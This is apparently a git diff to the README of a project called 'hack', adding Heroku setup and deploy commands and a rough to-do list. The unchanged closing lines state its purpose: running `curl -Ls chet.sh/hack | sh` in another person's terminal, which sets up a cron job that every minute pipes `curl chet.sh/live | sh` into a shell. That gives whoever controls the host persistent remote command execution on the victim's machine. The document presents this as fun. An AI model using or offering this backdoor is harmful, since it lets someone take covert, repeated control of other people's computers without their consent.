@@ -1,5 +1,94 @@
 # Hack
 
+## Getting Started
+
+Clone, install, link:
+
+```sh
+git clone https://github.com/ccorcos/hack.git
+cd hack
+npm install
+npm link
+```
+
+Setup Heroku:
+
+```sh
+brew install heroku-toolbelt
+heroku login
+heroku create hacker-chet
+echo "ROOT_URL=$(heroku info -s | grep web-url | cut -d= -f2)" >> .env
+```
+
+Run locally:
+
+```sh
+npm start # alias for `heroku local web`
+```
+
+Deploy to Heroku:
+
+```sh
+npm run deploy # alias for `git push origin heroku`
+```
+
+
+
+- git push heroku master
+
+
+- heroku ps:scale web=1
+- heroku open
+
+
+- heroku logs --tail
+
+
+- heroku local web
+
+
+
+- xo?
+
+
+# To Do
+
+- CLI should generate shell scripts with "HACK_URL" which will get injected by express based on the heroku config
+
+-
+
+xo and test
+
+
+update without pushing / redeploying?
+
+heroku config:set HEROKU_URL=$(heroku info -s | grep web-url | cut -d= -f2)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 Start hacking someone by running this command from their Terminal: `curl -Ls chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl chet.sh/live | sh`.
 
 Now go to your commandline and we can start having some fun.
